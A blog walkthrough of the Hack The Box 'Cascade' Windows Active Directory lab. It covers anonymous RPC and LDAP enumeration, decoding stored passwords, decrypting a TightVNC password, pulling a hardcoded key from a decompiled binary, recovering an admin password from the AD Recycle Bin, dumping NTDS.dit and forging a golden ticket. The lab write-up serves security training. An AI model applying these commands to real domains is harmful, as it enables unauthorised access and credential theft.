+++
tags = ["Box", "HTB", "Active Directory", "Windows", "LDAP", "RPC", "SQL", "CSharp"]
draft = false
title = "Cascade HTB Walkthrough"
author = "bloodstiller"
date = 2024-10-16
toc = true
bold = true
next = true
+++

## Cascade Hack The Box Walkthrough/Writeup: {#cascade-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Cascade>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.
-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}

-   **Basic Scan**:

    -   `nmap $box -Pn -oA basicScan`

    <!--listend-->

    ```shell
    kali in 46.02-HTB/BlogEntriesMade/Cascade/scans/nmap  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
    🕙 17:50:51 zsh ❯ nmap $box -Pn -oA basicScan
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-14 17:50 BST
    Nmap scan report for 10.129.136.213
    Host is up (0.040s latency).
    Not shown: 986 filtered tcp ports (no-response)
    PORT      STATE SERVICE
    53/tcp    open  domain
    88/tcp    open  kerberos-sec
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    389/tcp   open  ldap
    445/tcp   open  microsoft-ds
    636/tcp   open  ldapssl
    3268/tcp  open  globalcatLDAP
    3269/tcp  open  globalcatLDAPssl
    49154/tcp open  unknown
    49155/tcp open  unknown
    49157/tcp open  unknown
    49158/tcp open  unknown
    49165/tcp open  unknown

    ```

    -   **Initial thoughts**:
        -   DNS, Kerberos, SMB &amp; LDAP all great for enumerating.

-   **In depth scan**:

    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`

    <!--listend-->

    ```shell
    kali in 46.02-HTB/BlogEntriesMade/Cascade/scans/nmap  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh  took 10s
    🕙 17:51:04 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
    [sudo] password for kali:
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-14 17:51 BST
    Nmap scan report for 10.129.136.213
    Host is up (0.039s latency).
    Not shown: 65520 filtered tcp ports (no-response)
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
    | dns-nsid:
    |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-14 16:55:35Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    49154/tcp open  msrpc         Microsoft Windows RPC
    49155/tcp open  msrpc         Microsoft Windows RPC
    49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49158/tcp open  msrpc         Microsoft Windows RPC
    49165/tcp open  msrpc         Microsoft Windows RPC
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose|phone|specialized
    Running (JUST GUESSING): Microsoft Windows 2008|7|Phone|Vista|8.1 (89%)
    OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1
    Aggressive OS guesses: Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%), Microsoft Windows 8.1 Update 1 (89%), Microsoft Windows Phone 7.5 or 8.0 (89%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (89%), Microsoft Windows Vista SP2 (89%), Microsoft Windows Embedded Standard 7 (88%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (88%)
    No exact OS matches for host (test conditions non-ideal).
    Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

    Host script results:
    | smb2-security-mode:
    |   2:1:0:
    |_    Message signing enabled and required
    | smb2-time:
    |   date: 2024-10-14T16:56:32
    |_  start_date: 2024-10-14T16:47:45

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 324.37 seconds

    ```

    -   **Findings**:


### DNS `53`: {#dns-53}

-   **Using dnsenum to enumerate DNS entries**:
    -   `dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain`
    -   {{< figure src="/ox-hugo/2024-10-14-181730_.png" >}}
    -   Nothing of note, just standard DNS entries.


### Kerberos `88`: {#kerberos-88}


#### Using [Kerbrute](https://github.com/ropnop/kerbrute) to bruteforce Usernames: {#using-kerbrute-to-bruteforce-usernames}

-   As kerberos is present we can enumerate users using [kerbrute](https://github.com/ropnop/kerbrute):
    -   `kerbrute userenum -d $domain --dc casc-dc1.cascade.local  ~/Wordlists/statistically-likely-usernames/jsmith.txt`
    -   I get no hits.


### SMB `445`: {#smb-445}


#### Attempting to connect with NULL &amp; Guest sessions: {#attempting-to-connect-with-null-and-guest-sessions}

-   **This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold**:
    -   `netexec smb $box -u 'guest' -p '' --shares`
    -   `netexec smb $box -u '' -p '' --shares`
    -   {{< figure src="/ox-hugo/2024-10-14-180255_.png" >}}
    -   Neither work.


### RPC `111`: {#rpc-111}

As RPC is running on the host we can attempt to enumerate using it.

```shell
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
```

-   **Connecting to** `RPC` **using a null session with** `rpcclient`:
    -   `rpcclient -U "%" $box`
    -   {{< figure src="/ox-hugo/2024-10-14-191319_.png" >}}
    -   Awesome we can get a null session.

-   +Note+: I actually wrote a cheat-sheet blog off of the back of this enumeration which goes into a deep dive regarding `RPC`:
    -   <https://bloodstiller.com/cheatsheets/rpc-cheatsheet/>


#### Enumerating users with `rpcclient`: {#enumerating-users-with-rpcclient}

-   **Enumerating users**:
    -   `enumdomusers`
    -   {{< figure src="/ox-hugo/2024-10-14-191335_.png" >}}
    -   There are some interesting things straight away here. The `CascGuest` &amp; `BackupSvc` accounts.
    -   It looks like they have replaced their standard `Guest` account with `CascGuest`

-   **I attempt to connect as** `CascGuest` **using netexec**:
    -   {{< figure src="/ox-hugo/2024-10-15-072611_.png" >}}
    -   It fails.

-   **I attempt to add myself as a user to the domain but am denied**:
    -   `createdomuser bloodstiller`
    -   {{< figure src="/ox-hugo/2024-10-15-075804_.png" >}}

-   Now that we have the user &amp; group `RIDs` we can enumerate further.


#### Discovering User Login Scripts with `rpcclient`: {#discovering-user-login-scripts-with-rpcclient}

-   **Using rpcclient we can enumerate specific by passing their** `RID` **to the command** `queryuser`
    -   `queryuser 0x453`

-   **Steve Smith has the** `MapAuditDrive.vbs`:
    -   {{< figure src="/ox-hugo/2024-10-15-070637_.png" >}}

-   **Multiple Users have the** `MapDataDrive.vbs` **logon script**:
    -   James Wakefield
    -   Stephanie Hickson
    -   John Goodhand
    -   Edward Crowe
    -   David Burman
    -   Joseph Allen
    -   Ian Croft


#### Enumerating Groups with `rpcclient`: {#enumerating-groups-with-rpcclient}

-   **Enumerating groups with** `rpcclient`:
    -   `enumdomgroups`
    -   {{< figure src="/ox-hugo/2024-10-14-191420_.png" >}}

-   **I enumerate all of these groups however there is no additional information in their description fields**:
    -   `querygroup RID`
    -   {{< figure src="/ox-hugo/2024-10-15-081312_.png" >}}

-   **I enumerate builtin groups too however it says they do not exist when trying to delve further**:
    -   `enumalsgroups builtin`
    -   {{< figure src="/ox-hugo/2024-10-15-082208_.png" >}}

-   **I do the same again with the domain groups but have the same issue**:
    -   `enumalsgroups domain`
    -   {{< figure src="/ox-hugo/2024-10-15-082111_.png" >}}


##### Why so many different `rpcclient` group enumeration commands? {#why-so-many-different-rpcclient-group-enumeration-commands}

-   Just in-case you are wondering, why has he listed all of these different ways to list groups &amp; gotten different results each time?
    -   `enumdomgroups`: Lists domain-wide groups that are used across the Active Directory domain.
    -   `enumalsgroups domain`: Lists local alias groups that are specific to the domain controller or server itself.


#### Enumerating the password policy with `rpcclient`: {#enumerating-the-password-policy-with-rpcclient}

-   **I get the domains password policy**:
    -   `getdompwinfo`
    -   {{< figure src="/ox-hugo/2024-10-15-085104_.png" >}}
    -   But what does this mean?


##### Understanding `password_properties`: {#understanding-password-properties}

-   `password_properties` is a bitmask, where different bits control specific password policies.

-   **Here are the common flags and what each bit represents**:
    -   **Hex Value**: `0x00000001`
    -   **Flag**: `DOMAIN_PASSWORD_COMPLEX`
    -   **Meaning**: Enforces password complexity (requires uppercase, lowercase, digits, symbols)

    -   **Hex Value**: `0x00000002`
    -   **Flag**: `DOMAIN_PASSWORD_NO_ANON_CHANGE`
    -   **Meaning**: Prevents anonymous users from changing passwords

    -   **Hex Value**: `0x00000004`
    -   **Flag**: `DOMAIN_PASSWORD_NO_CLEAR_CHANGE`
    -   **Meaning**: Prevents passwords from being sent in cleartext

    -   **Hex Value**: `0x00000008`
    -   **Flag**: `DOMAIN_LOCKOUT_ADMINS`
    -   **Meaning**: Locks out administrators as well when lockout occurs

    -   **Hex Value**: `0x00000010`
    -   **Flag**: `DOMAIN_PASSWORD_STORE_CLEARTEXT`
    -   **Meaning**: Allows storing passwords using reversible encryption (cleartext)

    -   **Hex Value**: `0x00000020`
    -   **Flag**: `DOMAIN_REFUSE_PASSWORD_CHANGE`
    -   **Meaning**: Prevents users from changing their password

    -   **Hex Value**: `0x00000000`
    -   **Meaning**: Means that none of these password restrictions are enabled.

-   In this case, no complexity rules, no restrictions on anonymous password changes, and no other special password policies are applied.


### LDAP `389`: {#ldap-389}


#### Using LDAP anonymous bind to enumerate further: {#using-ldap-anonymous-bind-to-enumerate-further}

-   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
    -   We can actually retrieve a significant amount of information via anonymous bind such as:
        -   A list of all users
        -   A list of all groups
        -   A list of all computers.
        -   User account attributes.
        -   The domain password policy.
        -   Enumerate users who are susceptible to AS-REPRoasting.
        -   Passwords stored in the description fields
    -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.

<!--listend-->

-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapchecker>
        -   `python3 ldapchecker.py $box`

-   It turns out the anonymous bind is enabled however we can still get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.
    1.  <span class="underline">We have the naming context of the domain</span>:
        ```shell
        kali in ~/Desktop/WindowsTools 🐍 v3.12.6  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
        🕙 09:05:48 zsh ❯ python3 ldapchecker.py $box
        Attempting to connect to 10.129.136.213 with SSL...
        Failed to connect with SSL. Retrying without SSL...
        Connected successfully. Retrieving server information...
        DSA info (from DSE):
          Supported LDAP versions: 3, 2
          Naming contexts:
            DC=cascade,DC=local
            CN=Configuration,DC=cascade,DC=local
            CN=Schema,CN=Configuration,DC=cascade,DC=local
            DC=DomainDnsZones,DC=cascade,DC=local
            DC=ForestDnsZones,DC=cascade,DC=local
        ```

    2.  <span class="underline">We have the domain functionaility level</span>:
        ```shell
          domainFunctionality:
            4
          forestFunctionality:
            4
          domainControllerFunctionality:
            4
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   +Note+: that any host os can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

            -   In this case we can see it is level 4 which means that this server has to be running Windows Server 2008 R2 or newer.
            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   +Note+:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

    3.  <span class="underline">We have the full server name</span>:
        ```shell
         serverName:
            CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local
        ```
-   It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
    -   We have the naming context.
    -   Domain name.

-   **I update my `/etc/hosts` file now that we have the server name**.
    -   This is so we can use tools like [kerbrute](https://github.com/ropnop/kerbrute) for user enumeration as well as other tools later on.


#### LDAP User &amp; Group Enumeration Using Anonymous Bind: {#ldap-user-and-group-enumeration-using-anonymous-bind}

-   **As anonymous bind is enabled we can enumerate all the users on the domain also**:
    -   `ldapsearch -H ldap://casc-dc1.$domain:389 -x -b "DC=cascade,DC=local" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" " >> ldapUsers.txt`
    -   {{< figure src="/ox-hugo/2024-10-15-091335_.png" >}}

-   **My first command just extacted SAM names, which we already have from RPC, so lets extract all the users information**:
    -   `ldapsearch -H ldap://casc-dc1.$domain:389 -x -b "DC=cascade,DC=local" -s sub "(&(objectclass=user))" >> ldapUsersAll.txt`

<!--listend-->

-   **As anonymous bind is enabled we can enumerate all the groups on the domain also**:
    -   `ldapsearch -H ldap://casc-dc1.$domain:389 -x -b "DC=cascade,DC=local" -s sub "(&(objectclass=Group))" | grep sAMAccountName: | cut -f2 -d" " >> ldapGroups.txt`
    -   {{< figure src="/ox-hugo/2024-10-15-091420_.png" >}}


## 2. Foothold: {#2-dot-foothold}


### Finding a password in the `cascadeLegacyPwd` field: {#finding-a-password-in-the-cascadelegacypwd-field}

-   Looking through the extracted user data from `ldap` I see there is a field called `cascadeLegacyPwd` in the users r.thompson's entry.
    -   {{< figure src="/ox-hugo/2024-10-15-093536_.png" >}}

-   **I test the password with** `netexec` **but it doesn't work**:
    -   `netexec smb $box -u $user -p $pass --shares`
    -   {{< figure src="/ox-hugo/2024-10-15-094029_.png" >}}

+It dawns on me, it's `base64` encoded!!!+

-   **I decode the password**:
    -   `echo $pass | base64 -d`
    -   {{< figure src="/ox-hugo/2024-10-15-094344_.png" >}}
    -   +Note+:
        -   Ironically it would have been a better password in it's `bas64` encoded form as it has:
            -   Uppercase
            -   Lowercase
            -   Numbers
            -   Symbols
            -   Is longer.


### Enumerating the domain as `r.thompson`: {#enumerating-the-domain-as-r-dot-thompson}

-   **I check ryan's creds with** `netexec` **and get access**:
    -   `netexec smb $box -u $user -p $pass --shares`
    -   {{< figure src="/ox-hugo/2024-10-15-094721_.png" >}}


#### Pillaging the `IT` SMB Share: {#pillaging-the-it-smb-share}

-   **I connect using** `smbclient`:
    -   `smbclient -U $domain\\$user \\\\$box\\Data`
    -   {{< figure src="/ox-hugo/2024-10-15-095053_.png" >}}

-   **I find shares and see if I can access them all however I am only able to access the** `IT` **share currently**:
    -   {{< figure src="/ox-hugo/2024-10-15-095302_.png" >}}

-   **I find a file called** `Meeting_Notes_June_2018.html` **in the** `Email Archives` **directory I download it**:
    -   `get Meeting_Notes_June_2018.html`
    -   {{< figure src="/ox-hugo/2024-10-15-095512_.png" >}}

-   **I find a file called** `ArkAdRecycleBin.log` **in the** `Logs\Ark AD Recycle Bin\` **folder**:
    -   `get ArkAdRecycleBin.log`
    -   {{< figure src="/ox-hugo/2024-10-15-104922_.png" >}}

-   **I find a file called** `dcdiag.log` **in the** `Logs\DCs\` **folder**:
    -   `get dcdiag.log`
    -   {{< figure src="/ox-hugo/2024-10-15-104956_.png" >}}

-   **I find a file called** `VNC Install.reg *in the* \IT\Temp\s.smith\` **folder**:
    -   `get "VNC Install.reg"`
    -   {{< figure src="/ox-hugo/2024-10-15-105208_.png" >}}


#### Pillaging the `NETLOGON` share: {#pillaging-the-netlogon-share}

-   **I access the** `NETLOGON` **share**:
    -   `smbclient -U $domain\\$user \\\\$box\\NETLOGON`
-   **I find two scripts**:
    -   `MapAuditDrive.vbs` &amp; `MapDataDrive.vbs`
-   **I download them both**:
    -![](/ox-hugo/2024-10-15-105446_.png)


### Finding that there is a `TempAdmin` account with the same password as normal `admin`: {#finding-that-there-is-a-tempadmin-account-with-the-same-password-as-normal-admin}

-   In the `Meeting_Notes_June_2018.html` file it says there is a `TempAdmin` account that should have the same password as the normal `Admin`
    -   {{< figure src="/ox-hugo/2024-10-15-114843_.png" >}}

-   **However looking at** `ArkAdRecycleBin.log` **it looks like this account has already been deleted**:
    -   {{< figure src="/ox-hugo/2024-10-15-114958_.png" >}}
    -   We will file this away incase it is useful later.


### Finding a `TightVNC` password in `VNC Install.reg` {#finding-a-tightvnc-password-in-vnc-install-dot-reg}

-   Looking at the `VNC Install.reg` file I can see it's the registyr entry for a `TightVNC` install:
-   There is a hard-coded hex password in the file:
    -   {{< figure src="/ox-hugo/2024-10-15-111530_.png" >}}

-   **Some quick** `DuckDuckGoing` **(doesn't sound as cool as "Googling") &amp; I find a decryption method**:
    -   According to [this entry](https://github.com/frizb/PasswordDecrypts?tab=readme-ov-file) VNC uses a hard-coded DES key to store credentials. And the same key is used across multiple different products.

-   **I use the command at the bottom of the page &amp; get the clear-text password**:
    -   `echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv`
    -   {{< figure src="/ox-hugo/2024-10-15-111420_.png" >}}

-   **I test if it's** `s.smiths` **&amp; it is**:
    -   `netexec smb $box -u $user -p $pass`
    -   {{< figure src="/ox-hugo/2024-10-15-113715_.png" >}}


### Running a bloodhound collection: {#running-a-bloodhound-collection}

-   **It's about time we ran a bloodhound collection after grabbing all the low-hanging fruit**:
    -   `python3 bloodhound.py -dc casc-dc1.$domain -c All -u $user -p $pass -d $domain -ns $box`
    -   {{< figure src="/ox-hugo/2024-10-15-113948_.png" >}}


### Enumerating as `s.smith`: {#enumerating-as-s-dot-smith}

-   **Looking at the bloodhound data we can see that** `s.smith` **is part of numerous groups**:
    -   {{< figure src="/ox-hugo/2024-10-15-115709_.png" >}}
    -   We can see he is part of the "Remote Management Users" so we should be able to get access to the machine now.

-   **I access the host via** `evil-winrm`:
    -   `evil-winrm -i $box -u $user -p $pass`
    -   {{< figure src="/ox-hugo/2024-10-15-115931_.png" >}}

-   **Get our user flag**:
    -   {{< figure src="/ox-hugo/2024-10-15-120050_.png" >}}


### Enumerating &amp; pillaging the `audit$` share: {#enumerating-and-pillaging-the-audit-share}

-   **We can see that they also have access to the** `audit$` **share**:
    -   {{< figure src="/ox-hugo/2024-10-15-120246_.png" >}}

-   **I connect using** `smbclient`:
    -   `smbclient -U $domain\\$user \\\\$box\\Audit$`
    -   {{< figure src="/ox-hugo/2024-10-15-120555_.png" >}}
    -   There are alot of interesting things here.

-   **To make life easier I create a** `.tar` **file of all the files**:
    -   `tar c all.tar`
    -   {{< figure src="/ox-hugo/2024-10-15-120843_.png" >}}
    -   +Note+: This will make a `.tar` of all the files **excluding** directories and download it automatically.

-   **I download the remaining files in the directories**:
    -   `x86\SQLite.Interop.dll`
    -   `x64\SQLite.Interop.dll`
    -   `DB\Audit.db`


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Examining `DB\Audit.db`: {#examining-db-audit-dot-db}

-   **I open** `DB\Audit.db` **in** `sqlitebrowser`:
    -   The `ldap` table appears to have the credentials for the `ArkSvc` service.
    -   {{< figure src="/ox-hugo/2024-10-15-122927_.png" >}}
    -   I try &amp; base64 decode it however it appears to be a malformed string:
        -   {{< figure src="/ox-hugo/2024-10-15-123230_.png" >}}
    -   It could be encrypted and we don't have the encryption key.

-   **The rest of the tables related to deleted accounts**:
    -   {{< figure src="/ox-hugo/2024-10-15-123927_.png" >}}

-   **Looking at** `RunAudit.bat` **we can see it is just used to run** `CascAudit.exe` **&amp; pass the** `Audit.db` **to it**:
    -   {{< figure src="/ox-hugo/2024-10-15-130527_.png" >}}

-   **I want to decompile the** `.exe` **and** `dll` **so will fire up my command windows vm**:
    -   If you're unfamiliar with the command project, it's great: <https://github.com/mandiant/commando-vm>
    -   It's an offensive VM with loads of great tools.


### Finding a hardcoded decryption key in the `CascAudit.exe` binary using `DNSpy`: {#finding-a-hardcoded-decryption-key-in-the-cascaudit-dot-exe-binary-using-dnspy}

-   **Opening the** `CascAudit.exe` **in** `DNSpy` **I immediately find a hard-coded decryption key win the** `MainModule`.
    -   {{< figure src="/ox-hugo/2024-10-15-170613_.png" >}}


#### Let's break this code down: {#let-s-break-this-code-down}

-   **Below is the code that we are most interested in.**
    -   Lets break it down.
        ```c
          {
         using (SQLiteConnection sQLiteConnection = new SQLiteConnection("Data Source=" + MyProject.Application.CommandLineArgs[0] + ";Version=3;"))
         {
                 string text = string.Empty;
                 string password = string.Empty;
                 string text2 = string.Empty;
                 try
                 {
                      sQLiteConnection.Open();
                      using (SQLiteCommand sQLiteCommand = new SQLiteCommand("SELECT * FROM LDAP", sQLiteConnection))
                      {
        	                  using (SQLiteDataReader sQLiteDataReader = sQLiteCommand.ExecuteReader())
        	                  {
        		                      sQLiteDataReader.Read();
        		                      text = Conversions.ToString(sQLiteDataReader["Uname"]);
        		                      text2 = Conversions.ToString(sQLiteDataReader["Domain"]);
        		                      string encryptedString = Conversions.ToString(sQLiteDataReader["Pwd"]);
        		                      try
        		                      {
        			                          password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
        		                      }
        		                      catch (Exception ex2)
        		                      {
        			                          Console.WriteLine("Error decrypting password: " + ex2.Message);
        			                          return;
        		                      }
        	                  }
                      }
                      sQLiteConnection.Close();
                 }

        ```
-   **Database Connection and Initialization**
    ```
    using (SQLiteConnection sQLiteConnection = new SQLiteConnection("Data Source=" [PlusSymbol] MyProject.Application.CommandLineArgs[0] [PlusSymbol] ";Version=3;"))
    ```
    -   Creates a new SQLite connection using the database file path from the first command-line argument.
    -   `string text = string.Empty;`
    -   `string password = string.Empty;`
    -   `string text2 = string.Empty;`
        -   Initializes empty strings to store the username (`text`), password, and domain (`text2`).
    -   `sQLiteConnection.Open();`
        -   Opens the SQLite database connection.

<!--listend-->

-   **Querying the Database**
    -   `using (SQLiteCommand sQLiteCommand = new SQLiteCommand("SELECT * FROM LDAP", sQLiteConnection))`
        -   Creates an SQL command to select all data from the LDAP table.
    -   `using (SQLiteDataReader sQLiteDataReader = sQLiteCommand.ExecuteReader())`
        -   Executes the SQL command and creates a reader for the results.
    -   `sQLiteDataReader.Read();`
        -   Reads the first row of the query results.

-   **Retrieving LDAP Credentials**:
    -   `text = Conversions.ToString(sQLiteDataReader["Uname"]);`
    -   `text2 = Conversions.ToString(sQLiteDataReader["Domain"]);`
    -   `string encryptedString = Conversions.ToString(sQLiteDataReader["Pwd"]);`
    -   Retrieves the username, domain, and encrypted password from the query results.
        -   Stores these values in the respective variables.

-   **Password Decryption**:
    -   `password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");`
    -   Attempts to decrypt the password using a custom `Crypto.DecryptString` method.
        -   This is actually calling the `CascCrypto.dll` that was also available in the audit share.
    -   +Security Note+: The decryption key `"c4scadek3y654321"` is hardcoded, which is a significant security risk, as anyone who decompiles the binary can find this key.

-   **Cleanup**:
    -   `sQLiteConnection.Close();`
    -   Closes the SQLite database connection.

-   **So what does it do**?
    -   This code retrieves `LDAP` credentials from an `SQLite` database and decrypts the password.
        -   Remember we found `Audit.db` earlier which is an `SQLite` db which had an entry for the `ArkSvc` account&gt;


### Extracting the `ArkSvc` password from `CascAudit.exe`: {#extracting-the-arksvc-password-from-cascaudit-dot-exe}

-   +Requirements+: For this to work, we will need the `Audit.db` &amp; `CascCrypto.dll`, the `.dll` has to be in the same folder as the `.exe`

-   **Set a breakpoint in** `DNSpy`.
    -   Select the line with the encryption key &amp; right-click &amp; select "Add Breakpoint"
    -   {{< figure src="/ox-hugo/2024-10-15-175147_.png" >}}

-   **Click** "`Start`":
    -   {{< figure src="/ox-hugo/2024-10-15-175256_.png" >}}

-   **From the** "`Arguments`" **section ensure you select the location of the** `Audit.db`
    -   {{< figure src="/ox-hugo/2024-10-15-175405_.png" >}}
    -   Click "OK"
    -   +Note+:
        -   If you remember in `RunAudit.Bat` we can see that the argument the `.exe` takes is the location of the `.db`
            -   {{< figure src="/ox-hugo/2024-10-15-175605_.png" >}}

-   **The debugger will break on the line we selected, however to get the result we need to step over it**:
    -   {{< figure src="/ox-hugo/2024-10-15-175729_.png" >}}

-   **Once we have stepped over the clear text password will be visible**:
    -   {{< figure src="/ox-hugo/2024-10-15-175846_.png" >}}
    -   +Note+: It has trailing `\0\0\0`, these can be deleted.

-   **I verify the credentials work using** `netexec`:
    -   {{< figure src="/ox-hugo/2024-10-15-180211_.png" >}}


## 5. Ownership: {#5-dot-ownership}


### Enumerating as `arksvc`: {#enumerating-as-arksvc}

-   **Checking bloodhound I can see that** `arksvc` **has access to the** `AD Recyle Bin`:
    -   {{< figure src="/ox-hugo/2024-10-16-063920_.png" >}}
    -   If you remember we saw that temp-admin was in the recycle bin when we were looking at the recovered `Audit.db` file:
    -   {{< figure src="/ox-hugo/2024-10-16-065034_.png" >}}

-   After some quick searching I find [this article](https://www.poweradmin.com/blog/restoring-deleted-objects-from-active-directory-using-ad-recycle-bin/) which details how to recover deleted objects in the AD Recycle Bin. It says:

    > By default, if an object has been deleted, it can be recovered within a 180 days interval. This value is specified in the msDS-DeletedObjectLifetime attribute


### Finding the Administrator Password in the `cascadeLegacyPwd` field of a deleted object: {#finding-the-administrator-password-in-the-cascadelegacypwd-field-of-a-deleted-object}

-   **I list the objects in the recycling bin**:
    -   `Get-ADObject -filter ‘isdeleted -eq $true -and name -ne “Deleted Objects”‘ -includeDeletedObjects -property *`

-   **I immediately find the deleted** `temp-admin` **account**:
    -   {{< figure src="/ox-hugo/2024-10-16-065635_.png" >}}

<!--listend-->

-   **Looking at the entry we can see that is has the same** `cascadeLegacyPwd` **field that we found before that contained a base64 encoded password**
    -   {{< figure src="/ox-hugo/2024-10-16-065447_.png" >}}
    -   If you remember when we looked at `Meeting_Notes_June_2018.html` it said that the temp-admin and normal admin have the same password:
        -   {{< figure src="/ox-hugo/2024-10-16-065824_.png" >}}

-   **I decode the password**:
    -   {{< figure src="/ox-hugo/2024-10-16-070206_.png" >}}

-   **Boom we have root**:
    -   {{< figure src="/ox-hugo/2024-10-16-070304_.png" >}}

-   **Lets get our root flag**:
    -   {{< figure src="/ox-hugo/2024-10-16-070357_.png" >}}


## 4. Persistence: {#4-dot-persistence}

### Dumping NTDS.dit: {#dumping-ntds-dot-dit}

-   **Lets dump the** `NTDS.dit` **database using netexec**:
    -   `netexec smb $box -u $user -p $pass -M ntdsutil`
    -   {{< figure src="/ox-hugo/2024-10-16-071246_.png" >}}


### Creating a Golden Ticket: {#creating-a-golden-ticket}

1.  **Using** `impacket-lookupsid` **to extract the domain** `SID`:
    -   `impacket-lookupsid $domain/administrator@$box -domain-sids`
    -   {{< figure src="/ox-hugo/2024-10-16-071632_.png" >}}

2.  **I use** `impacket-ticketer` **to create the ticket**:
    -   {{< figure src="/ox-hugo/2024-10-16-071717_.png" >}}
    -   It kicks out a bunch of errors but creates the `administrator.ccache`

3.  **I sync my clock with the target**:
    -   `sudo ntpdate -s casc-dc1.$domain`
    -   {{< figure src="/ox-hugo/2024-10-16-071759_.png" >}}

4.  **I load the ticket into the** `KRB5CCNAME` **Variable**:
    -   `export KRB5CCNAME=./administrator.ccache`
